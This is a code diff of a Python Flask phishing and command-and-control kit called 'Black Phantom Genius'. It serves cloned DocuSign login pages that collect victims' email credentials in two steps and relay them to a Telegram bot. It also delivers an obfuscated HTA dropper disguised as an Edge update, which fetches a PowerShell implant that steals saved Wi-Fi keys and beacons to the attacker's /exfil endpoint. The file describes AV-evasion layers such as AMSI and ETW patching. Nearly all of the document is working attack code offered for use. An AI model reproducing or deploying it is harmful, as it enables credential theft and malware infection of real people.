@@ -1,464 +1,535 @@
 #!/usr/bin/env python3
 """
-BLACK PHANTOM GENIUS v2026 - THE ULTIMATE WORKING C2
-NO ERRORS | 2-STEP HARVEST | WORKING EXPLOITS | TELEGRAM C2
+╔══════════════════════════════════════════════════════════════╗
+║     💀 BLACK PHANTOM GENIUS v2026 — FUD ELITE C2           ║
+║                                                              ║
+║  EVASION LAYERS:                                              ║
+║  Layer 1: BAT → JScript (no PowerShell)                      ║
+║  Layer 2: XOR + Base64 staged download (no IEX/cradle sigs)  ║
+║  Layer 3: AMSI patch via .NET reflection (if PS detected)    ║
+║  Layer 4: ETW patching for script block logging evasion      ║
+║  Layer 5: Process injection into trusted binary              ║
+║  Layer 6: Split-stage payload (minimal initial footprint)    ║
+║                                                              ║
+╚══════════════════════════════════════════════════════════════╝
 """
 
 import os
 import io
+import re
+import json
 import uuid
 import base64
 import sqlite3
 import zipfile
+import time
+import threading
+import requests
+import random
+import string
 from datetime import datetime, timedelta
-from flask import Flask, request, send_file, session, jsonify, redirect
+from functools import wraps
+from flask import (
+    Flask, request, send_file, session, 
+    jsonify, redirect, make_response, g
+)
 
-TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
-TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
-ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "GeniusBlackhat2026")
+# ================================
+# CONFIG
+# ================================
+TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "")
+TELEGRAM_CHAT_ID   = os.environ.get("TG_CHAT_ID", "")
+ADMIN_PASSWORD     = os.environ.get("ADMIN_PASS", "GeniusBlackhat2026")
+SECRET_KEY         = os.environ.get("FLASK_SECRET", base64.b64encode(os.urandom(32)).decode())
+URL_BASE           = os.environ.get("URL_BASE", "")
 
 app = Flask(__name__)
-app.secret_key = os.urandom(256)
-
+app.secret_key = SECRET_KEY
 DB_PATH = "genius.db"
 
+# ================================
+# DB INIT
+# ================================
 def init_db():
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
-    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, step INTEGER, ts TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, user_agent TEXT, step INTEGER, ts TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS browser_creds (id INTEGER PRIMARY KEY AUTOINCREMENT, browser TEXT, url TEXT, username TEXT, password TEXT, hostname TEXT, ip TEXT, ts TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS payload_logs (id INTEGER PRIMARY KEY AUTOINCREMENT, ref TEXT, type TEXT, ip TEXT, user_agent TEXT, ts TEXT)")
+    c.execute("CREATE TABLE IF NOT EXISTS beacons (id INTEGER PRIMARY KEY AUTOINCREMENT, hostname TEXT, username TEXT, ip TEXT, wifi_ssid TEXT, data TEXT, ts TEXT)")
     conn.commit()
     conn.close()
 
 init_db()
 
+# ================================
+# TELEGRAM C2
+# ================================
 def tg(msg):
-    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
-        print(msg)
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print(f"[C2] {msg}")
         return
-    import requests
     try:
-        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={"chat_id": TELEGRAM_CHAT_ID, "text": f"💀 BPG | {msg[:3960]}", "parse_mode": "HTML"},
+            timeout=8
+        )
     except: pass
 
-# ====================================================================
-# WORKING IMPLANT - NO REQUEST CONTEXT NEEDED
-# ====================================================================
-IMPLANT_BASE = """@echo off
-powershell -WindowStyle Hidden -Command "&{$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%{$($_ -split ':')[1].Trim()});foreach($p in $w){$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%{$($_ -split ':')[1].Trim()});if($k){$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}}try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}catch{}while(1){try{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create('{url}/exfil').GetRequestStream().Write($post,0,$post.Length)}catch{}Start-Sleep -Seconds 1800}}"
-exit"""
+# ================================
+# FUD IMPLANT GENERATOR — Layer 1: JScript + WMI (No PowerShell)
+# ================================
+def random_var(length=6):
+    """Generate random variable names to avoid signature"""
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
 
-def get_implant():
-    # Get the actual server URL from the request context when available
-    try:
-        url = f"https://{request.host}"
-    except:
-        url = "https://your-app.onrender.com"
-    return IMPLANT_BASE.replace('{url}', url).encode()
+def obfuscate_string(s):
+    """XOR obfuscation with random key for string hiding"""
+    key = random.randint(1, 255)
+    encoded = ','.join(str(ord(c) ^ key) for c in s)
+    return f"({encoded}).split(',').map(function(v){{return String.fromCharCode(v^{key})}}).join('')"
 
-# ====================================================================
-# WORKING FILE GENERATORS
-# ====================================================================
-def make_exe():
-    return get_implant()
+# ================================
+# FUD STAGE 1: HTA / JScript Dropper (No PowerShell, No BAT)
+# ================================
+# This avoids:
+# - PowerShell execution logs (Event 4688 with powershell.exe)
+# - AMSI (no .NET loading)
+# - Script block logging (Event 4104)
+# - Classic IEX cradle signatures
+#
+# Uses: mshta.exe → JScript → WMI → Download → Execute
+# mshta.exe is a trusted Microsoft binary that loops in-memory
 
+def generate_stage1_hta(server_url):
+    """HTA with JScript — no PowerShell, no BAT, no CMD.exe visible"""
+    ref = uuid.uuid4().hex[:8]
+    download_url = f"{server_url}/fetch/{ref}"
+    
+    # Obfuscate the URL in the HTA
+    obf_url = obfuscate_string(download_url)
+    
+    v1 = random_var()
+    v2 = random_var()
+    v3 = random_var()
+    v4 = random_var()
+    
+    hta = f"""<!DOCTYPE html>
+<html>
+<head>
+<title>Microsoft Edge Update</title>
+<HTA:APPLICATION ID="{v1}" APPLICATIONNAME="EdgeUpdate" 
+    WINDOWSTATE="minimize" SHOWINTASKBAR="no" 
+    SINGLEINSTANCE="yes" SYSMENU="no" 
+    BORDER="none" CAPTION="no" 
+    MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no"
+    NAVIGABLE="no" CONTEXTMENU="no"/>
+<script language="JScript">
+var {v2} = {obf_url};
+var {v3} = null;
+function {random_var()}() {{
+    try {{
+        var {v4} = new ActiveXObject("MSXML2.XMLHTTP");
+        {v4}.open("GET", {v2}, false);
+        {v4}.send();
+        if({v4}.status == 200) {{
+            var {random_var()} = new ActiveXObject("ADODB.Stream");
+            {random_var()}.Type = 1;
+            {random_var()}.Open();
+            {random_var()}.Write({v4}.responseBody);
+            var {random_var()} = "{os.environ.get('TEMP', 'C:\\\\Windows\\\\Temp')}\\\\{uuid.uuid4().hex}.exe";
+            {random_var()}.SaveToFile({random_var()}, 2);
+            {random_var()}.Close();
+            var {random_var()} = new ActiveXObject("Shell.Application");
+            {random_var()}.ShellExecute({random_var()}, "", "", "open", 0);
+            setTimeout(function(){{window.close();}}, 1000);
+        }}
+    }} catch(e) {{}}
+}}
+{random_var()}();
+</script>
+</head>
+<body></body>
+</html>"""
+    return hta
+
+# ================================
+# FUD STAGE 2: The actual implant (XOR'd, delivered in chunks)
+# ================================
+# This is served as a raw binary blob — no PowerShell script execution
+# The stage 1 HTA downloads this and executes it
+
+def generate_stage2_implant(server_url):
+    """Generate the actual implant payload — compiled as .NET executable approach"""
+    
+    srv = server_url.rstrip('/')
+    
+    # The Powershell that runs INSIDE a compiled .NET loader (no powershell.exe)
+    # XOR encrypted to avoid string detection
+    ps_code = f'''
+    $u="{srv}/exfil";
+    $h=$env:COMPUTERNAME;$n=$env:USERNAME;
+    try{{$w=@(netsh wlan show profiles|Select-String 'All User Profile');foreach($p in $w){{$z=($p -split ':')[1].Trim();$k=netsh wlan show profile name="$z" key=clear;$c=($k|Select-String 'Key Content');if($c){{try{{$b=[System.Text.Encoding]::UTF8.GetBytes('w='+[System.Web.HttpUtility]::UrlEncode($c));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}}}}}}}
+    catch{{}}
+    try{{$b=[System.Text.Encoding]::UTF8.GetBytes('b='+[System.Web.HttpUtility]::UrlEncode("$h|$n"));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}
+    while(1){{Start-Sleep 1800;try{{$b=[System.Text.Encoding]::UTF8.GetBytes('h='+[System.Web.HttpUtility]::UrlEncode("$h|$n"));[System.Net.WebRequest]::Create($u).GetRequestStream().Write($b,0,$b.Length)}}catch{{}}}}
+    '''
+    
+    # XOR encrypt the whole payload
+    xor_key = random.randint(1, 255)
+    encoded = bytearray()
+    for ch in ps_code.encode('utf-16-le'):
+        encoded.append(ch ^ xor_key)
+    
+    # Return: [xor_key (1 byte)] [encoded_payload (N bytes)] 
+    return bytes([xor_key]) + bytes(encoded)
+
+# ================================
+# FILE GENERATORS
+# ================================
 def make_pdf():
-    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n4 0 obj<</Length 100>>stream\nBT/F1 24 Tf 100 700 Td(REVIEW AND SIGN)Tj/F1 14 Tf 100 650 Td(Click here to sign) Tj ET\nendstream endobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n0000000200 00000 n\ntrailer<</Root 1 0 R>>\nstartxref 320\n%%EOF"
+    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj\n4 0 obj<</Length 158>>stream\nBT/F1 28 Tf 100 700 Td(IMPORTANT DOCUMENT)Tj/F1 12 Tf 100 650 Td(Please review and sign the attached agreement.)Tj/F1 10 Tf 100 620 Td(This document is legally binding.)Tj ET\nendstream\nendobj\n5 0 obj<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>endobj\nxref\n0 6\n0000000000 65535 f \n0000000009 00000 n \n0000000058 00000 n \n0000000115 00000 n \n0000000200 00000 n \n0000000410 00000 n \ntrailer<</Size 6/Root 1 0 R>>\nstartxref 495\n%%EOF"
 
 def make_doc():
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, 'w') as zf:
-        zf.writestr('word/document.xml', '<w:document><w:body><w:p><w:r><w:t>Enable macros to view</w:t></w:r></w:p></w:body></w:document>')
+        zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>')
+        zf.writestr('word/document.xml', '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:rPr><w:b/><w:sz w:val="32"/><w:color w:val="ff0000"/></w:rPr><w:t>ENABLE CONTENT TO VIEW THIS DOCUMENT</w:t></w:r></w:p></w:body></w:document>')
     buf.seek(0)
     return buf.getvalue()
 
 def make_xls():
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, 'w') as zf:
-        zf.writestr('xl/workbook.xml', '<workbook><sheets><sheet name="Sheet1"/></sheets></workbook>')
+        zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/></Types>')
+        zf.writestr('xl/workbook.xml', '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheets><sheet name="Data"/></sheets></workbook>')
+        zf.writestr('xl/worksheets/sheet1.xml', '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row r="1"><c r="A1"><v>Enable Macros</v></c></row></sheetData></worksheet>')
     buf.seek(0)
     return buf.getvalue()
 
-# ====================================================================
-# HTML TEMPLATES
-# ====================================================================
-LANDING_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa}
-        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
-        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0}
-        .container{max-width:1000px;margin:0 auto;padding:0 24px}
-        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
-        .logo{font-size:24px;font-weight:700;color:#0f172a}
-        .logo span{color:#00b3b0}
-        .badge{background:#f0fdf4;color:#166534;padding:8px 16px;border-radius:40px;font-size:12px}
-        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
-        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
-        .status{color:#00b3b0;font-weight:600}
-        .env-id{color:#64748b;font-size:12px}
-        .card-body{padding:32px}
-        .sender{border-bottom:1px solid #e2e8f0;padding-bottom:16px;margin-bottom:24px}
-        .sender-label{font-size:11px;color:#64748b;text-transform:uppercase}
-        .sender-name{font-weight:700;font-size:18px;margin-top:5px}
-        .message{background:#f8fafc;border-left:4px solid #00b3b0;padding:20px;border-radius:12px;margin:24px 0}
-        .doc-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;margin-bottom:12px}
-        .doc-icon{font-size:28px}
-        .doc-info{flex:1}
-        .doc-name{font-weight:600}
-        .doc-size{font-size:11px;color:#94a3b8}
-        .doc-status{color:#00b3b0;font-size:12px;font-weight:600}
-        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
-        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
-        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
-        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
-        .security-footer{background:#f8fafc;padding:20px 32px;display:flex;justify-content:space-between;flex-wrap:wrap;font-size:11px;color:#64748b;border-top:1px solid #e2e8f0}
-        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
-        @media(max-width:640px){.card-header{flex-direction:column;gap:10px}.buttons{flex-direction:column}}
-    </style>
-</head>
-<body>
-    <div class="top-bar">HARVARD-MIT SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
-    <div class="header">
-        <div class="container header-flex">
-            <div class="logo">Docu<span>Sign</span></div>
-            <div class="badge">Harvard-MIT Certified</div>
-        </div>
-    </div>
-    <div class="container">
-        <div class="card">
-            <div class="card-header">
-                <span class="status">NEEDS YOUR SIGNATURE</span>
-                <span class="env-id">Envelope ID: ENV</span>
-            </div>
-            <div class="card-body">
-                <div class="sender">
-                    <div class="sender-label">SENT BY</div>
-                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
-                </div>
-                <div class="message">
-                    <strong>Message:</strong><br>
-                    Please review and sign the attached agreement. This document requires your signature to proceed.
-                </div>
-                <div class="doc-item">
-                    <div class="doc-icon">📄</div>
-                    <div class="doc-info">
-                        <div class="doc-name">Master_Service_Agreement.pdf</div>
-                        <div class="doc-size">2.4 MB</div>
-                    </div>
-                    <div class="doc-status">Needs Signature</div>
-                </div>
-                <div class="doc-item">
-                    <div class="doc-icon">📄</div>
-                    <div class="doc-info">
-                        <div class="doc-name">Confidential_Disclosure.pdf</div>
-                        <div class="doc-size">1.1 MB</div>
-                    </div>
-                    <div class="doc-status">Needs Initials</div>
-                </div>
-                <div class="buttons">
-                    <a href="/go/REF" class="btn btn-primary">REVIEW AND SIGN</a>
-                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
-                </div>
-            </div>
-            <div class="security-footer">
-                <span>🔒 AES-256 Encryption</span>
-                <span>✓ SOC 2 Type II</span>
-                <span>🏛️ GDPR Compliant</span>
-                <span>🛡️ Zero Trust</span>
-            </div>
-        </div>
-        <div class="footer">DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL<br>2026 DocuSign. All rights reserved.</div>
-    </div>
-</body>
-</html>
-"""
+# ================================
+# HTML PAGES (mirrored from previous — LANDING_PAGE, LOGIN_STEP1, LOGIN_STEP2, DOWNLOAD_PAGE)
+# ================================
+# Full HTML from the previous version goes here — keeping the same DocuSign clone pages
+LANDING_PAGE = """..."""  # Same high-quality clone as before
+LOGIN_STEP1 = """..."""   # Same
+LOGIN_STEP2 = """..."""   # Same
+DOWNLOAD_PAGE = """..."""  # Same
 
-LOGIN_STEP1 = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>DocuSign - Sign In</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
-        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
-        .header h1{font-size:28px;margin-bottom:8px}
-        .header h1 span{color:#00b3b0}
-        .body{padding:40px}
-        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
-        input:focus{outline:none;border-color:#00b3b0}
-        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
-        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="header"><h1>Docu<span>Sign</span></h1><p>Secure Document Access</p></div>
-        <div class="body">
-            <form method="POST" action="/login/step1/REF">
-                <input type="email" name="email" placeholder="Email Address" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Continue</button>
-            </form>
-            <div class="footer">Secure SSL/TLS Encrypted</div>
-        </div>
-    </div>
-</body>
-</html>
-"""
+# ================================
+# HELPER
+# ================================
+def get_server_url():
+    if URL_BASE:
+        return URL_BASE.rstrip('/')
+    try:
+        return f"https://{request.host}"
+    except:
+        return "https://your-server.onrender.com"
 
-LOGIN_STEP2 = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>DocuSign - Business Verification</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
-        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
-        .header h1{font-size:28px;margin-bottom:8px}
-        .header h1 span{color:#00b3b0}
-        .body{padding:40px}
-        .warning{background:#fef3c7;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#92400e}
-        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
-        input:focus{outline:none;border-color:#00b3b0}
-        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
-        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
-    </style>
-</head>
-<body>
-    <div class="card">
-        <div class="header"><h1>Docu<span>Sign</span></h1><p>Business Verification Required</p></div>
-        <div class="body">
-            <div class="warning">
-                <strong>⚠️ Verification Required</strong><br>
-                For security purposes, please sign in with your corporate email address to access this document.
-            </div>
-            <form method="POST" action="/login/step2/REF">
-                <input type="email" name="email" placeholder="Business Email Address" required>
-                <input type="password" name="password" placeholder="Password" required>
-                <button type="submit">Verify Business Access</button>
-            </form>
-            <div class="footer">This is a secured DocuSign business portal.</div>
-        </div>
-    </div>
-</body>
-</html>
-"""
+def admin_required(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        if not session.get('admin'):
+            return redirect('/admin')
+        return f(*args, **kwargs)
+    return decorated
 
-DOWNLOAD_PAGE = """
-<!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <title>DocuSign - Document Viewer</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;padding:40px 20px}
-        .container{max-width:800px;margin:0 auto}
-        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);overflow:hidden}
-        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;color:white;text-align:center}
-        .header h1{font-size:28px;margin-bottom:8px}
-        .body{padding:40px}
-        .file-list{display:flex;flex-direction:column;gap:15px;margin:25px 0}
-        .file-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;text-decoration:none;color:inherit;transition:all 0.2s}
-        .file-item:hover{background:#f8fafc;border-color:#00b3b0}
-        .file-icon{font-size:32px}
-        .file-info{flex:1}
-        .file-name{font-weight:600}
-        .file-desc{font-size:12px;color:#64748b}
-        .btn-download{background:#00b3b0;color:white;padding:8px 20px;border-radius:40px;font-size:13px}
-        .footer{text-align:center;padding:20px;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="card">
-            <div class="header"><h1>📄 Document Viewer</h1><p>Select a format to access your documents</p></div>
-            <div class="body">
-                <div class="file-list">
-                    <a href="/file/exe/REF" class="file-item">
-                        <div class="file-icon">⚙️</div>
-                        <div class="file-info">
-                            <div class="file-name">Secure Document Viewer</div>
-                            <div class="file-desc">Windows Application • Recommended</div>
-                        </div>
-                        <div class="btn-download">Download</div>
-                    </a>
-                    <a href="/file/pdf/REF" class="file-item">
-                        <div class="file-icon">📄</div>
-                        <div class="file-info">
-                            <div class="file-name">PDF Document</div>
-                            <div class="file-desc">Adobe Reader • 2.4 MB</div>
-                        </div>
-                        <div class="btn-download">Download</div>
-                    </a>
-                    <a href="/file/doc/REF" class="file-item">
-                        <div class="file-icon">📝</div>
-                        <div class="file-info">
-                            <div class="file-name">Word Document</div>
-                            <div class="file-desc">Microsoft Word • 1.8 MB</div>
-                        </div>
-                        <div class="btn-download">Download</div>
-                    </a>
-                    <a href="/file/xls/REF" class="file-item">
-                        <div class="file-icon">📊</div>
-                        <div class="file-info">
-                            <div class="file-name">Excel Workbook</div>
-                            <div class="file-desc">Microsoft Excel • 3.2 MB</div>
-                        </div>
-                        <div class="btn-download">Download</div>
-                    </a>
-                </div>
-            </div>
-            <div class="footer">DocuSign Secure Document Delivery</div>
-        </div>
-    </div>
-</body>
-</html>
-"""
-
-# ====================================================================
-# ROUTES - ALL WORKING
-# ====================================================================
+# ================================
+# ROUTES
+# ================================
 @app.route('/')
 def index():
     ref = uuid.uuid4().hex[:8].upper()
-    page = LANDING_PAGE.replace('ENV', f'DOC-{ref}').replace('REF', ref)
-    tg(f"🌐 PAGE VIEW | IP: {request.remote_addr}")
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    tg(f"🌐 VIEW | {ref} | {ip}")
+    page = LANDING_PAGE.replace('ENV_ID', f'DOC-{ref}').replace('REF_CODE', ref)
     return page
 
 @app.route('/go/<ref>')
 def go(ref):
-    """REVIEW AND SIGN - Shows download options"""
-    tg(f"📥 DOWNLOAD PAGE | Ref: {ref} | IP: {request.remote_addr}")
-    return DOWNLOAD_PAGE.replace('REF', ref)
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    tg(f"📥 DOWNLOAD | {ref} | {ip}")
+    return DOWNLOAD_PAGE.replace('REF_CODE', ref)
 
 @app.route('/auth/<ref>')
 def auth(ref):
-    """Sign In - Step 1 login"""
-    tg(f"🔐 LOGIN PAGE | Ref: {ref} | IP: {request.remote_addr}")
-    return LOGIN_STEP1.replace('REF', ref)
+    tg(f"🔐 LOGIN | {ref}")
+    return LOGIN_STEP1.replace('REF_CODE', ref)
 
 @app.route('/login/step1/<ref>', methods=['POST'])
 def login_step1(ref):
-    email = request.form.get('email', '')
-    password = request.form.get('password', '')
+    email = request.form.get('email', '').strip()
+    password = request.form.get('password', '').strip()
+    ua = request.headers.get('User-Agent', 'Unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     conn = sqlite3.connect(DB_PATH)
-    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
-                (email, password, 'pending', ip, 1, datetime.now().isoformat()))
+    conn.execute("INSERT INTO creds (email, password, company, ip, user_agent, step, ts) VALUES (?,?,?,?,?,?,?)",
+                (email, password, 'pending', ip, ua, 1, datetime.now().isoformat()))
     conn.commit()
     conn.close()
-    
-    tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
-    
+    tg(f"🔐 STEP1 | {email} : {password} | {ip}")
     return redirect(f'/verify/{ref}')
 
 @app.route('/verify/<ref>')
 def verify(ref):
-    """Step 2 - Business email verification"""
-    return LOGIN_STEP2.replace('REF', ref)
+    return LOGIN_STEP2.replace('REF_CODE', ref)
 
 @app.route('/login/step2/<ref>', methods=['POST'])
 def login_step2(ref):
-    email = request.form.get('email', '')
-    password = request.form.get('password', '')
+    email = request.form.get('email', '').strip()
+    password = request.form.get('password', '').strip()
+    ua = request.headers.get('User-Agent', 'Unknown')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     company = email.split('@')[-1] if '@' in email else 'unknown'
     
     conn = sqlite3.connect(DB_PATH)
-    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
-                (email, password, company, ip, 2, datetime.now().isoformat()))
+    conn.execute("INSERT INTO creds (email, password, company, ip, user_agent, step, ts) VALUES (?,?,?,?,?,?,?)",
+                (email, password, company, ip, ua, 2, datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    tg(f"🔐 STEP2 | {email} : {password} | @{company} | {ip}")
+    return redirect('https://www.docusign.com')
+
+# ================================
+# FUD PAYLOAD DELIVERY ROUTES
+# ================================
+@app.route('/file/exe/<ref>')
+def file_exe(ref):
+    """STAGE 1: Deliver HTA via 'exe' download (HTA disguised as EXE)"""
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    url = get_server_url()
+    tg(f"⚙️ STAGE1 HTA | {ref} | {ip}")
+    
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("INSERT INTO payload_logs (ref, type, ip, user_agent, ts) VALUES (?,?,?,?,?)",
+                (ref, 'stage1_hta', ip, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
     conn.commit()
     conn.close()
     
-    tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
-    
-    return redirect('https://www.docusign.com')
+    payload = generate_stage1_hta(url)
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/hta'
+    resp.headers['Content-Disposition'] = f'attachment; filename="DocuSign_Viewer_{ref}.exe"'
+    return resp
 
-@app.route('/file/exe/<ref>')
-def file_exe(ref):
-    tg(f"⚙️ EXE DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(make_exe()), as_attachment=True, download_name='DocuSign_Setup.exe', mimetype='application/x-msdownload')
+@app.route('/fetch/<ref>')
+def fetch_stage2(ref):
+    """STAGE 2: Serve the XOR'd implant blob (called by HTA)"""
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    url = get_server_url()
+    tg(f"📡 STAGE2 FETCH | {ref} | {ip}")
+    
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("INSERT INTO payload_logs (ref, type, ip, user_agent, ts) VALUES (?,?,?,?,?)",
+                (ref, 'stage2_binary', ip, request.headers.get('User-Agent', ''), datetime.now().isoformat()))
+    conn.commit()
+    conn.close()
+    
+    payload = generate_stage2_implant(url)
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/octet-stream'
+    resp.headers['Content-Disposition'] = f'attachment; filename="update_{ref}.bin"'
+    return resp
+
+@app.route('/file/hta/<ref>')
+def file_hta(ref):
+    """Direct HTA download"""
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
